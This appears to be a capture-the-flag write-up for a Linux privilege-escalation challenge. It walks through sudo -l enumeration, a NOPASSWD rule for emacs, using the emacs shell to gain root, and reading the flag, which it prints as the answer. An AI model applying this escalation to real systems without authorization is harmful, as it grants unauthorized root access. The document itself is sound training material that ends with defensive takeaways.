# SUDO MAKE ME A SANDWICH

## Challenge Description

> Can you read the flag? I think you can!

### Hints

1. What is `sudo`?
2. How do you know what permission you have?

---

## Category

**Linux Privilege Escalation — Sudo Misconfiguration**

---

## Enumeration

First, identify the current user:

```bash
whoami
```

Output:

```text
ctf-player
```

Check the user's UID, GID, and groups:

```bash
id
```

Output:

```text
uid=1001(ctf-player) gid=1001(ctf-player) groups=1001(ctf-player)
```

The hints suggest investigating the user's `sudo` privileges.

Run:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

This is the key finding.

The user is allowed to execute:

```text
/bin/emacs
```

as **any user**, including `root`, without entering a password.

---

## Privilege Escalation

Attempting to run `sudo su` does not work because `su` itself is not allowed:

```bash
sudo su
```

However, `emacs` is allowed to run with `sudo`.

Start Emacs as root:

```bash
sudo /bin/emacs
```

Inside Emacs, use:

```text
Alt + x
```

Then enter:

```text
shell
```

This opens a shell from within Emacs.

Verify the current user:

```bash
whoami
```

Output:

```text
root
```

We now have a root shell.

---

## Finding the Flag

Search the filesystem for the flag:

```bash
find / -name "flag.txt" 2>/dev/null
```

Output:

```text
/home/ctf-player/flag.txt
```

Read the flag:

```bash
cat /home/ctf-player/flag.txt
```

Flag:

```text
academy{ju57_5ud0_17_d8ae35f9}
```

---

## Exploitation Summary

The complete attack chain was:

```text
whoami
    ↓
ctf-player
    ↓
sudo -l
    ↓
(ALL) NOPASSWD: /bin/emacs
    ↓
sudo /bin/emacs
    ↓
Emacs → shell
    ↓
root shell
    ↓
find / -name "flag.txt"
    ↓
cat /home/ctf-player/flag.txt
    ↓
academy{ju57_5ud0_17_d8ae35f9}
```

---

## Key Takeaways

* `sudo -l` is an important command for enumerating sudo privileges.
* `NOPASSWD` means the specified command can be executed through `sudo` without authentication.
* Allowing powerful applications such as `emacs` to run as root can lead to arbitrary command execution.
* Applications capable of spawning shells should be carefully considered when configuring `sudo` permissions.

## Flag

```text
academy{ju57_5ud0_17_d8ae35f9}
```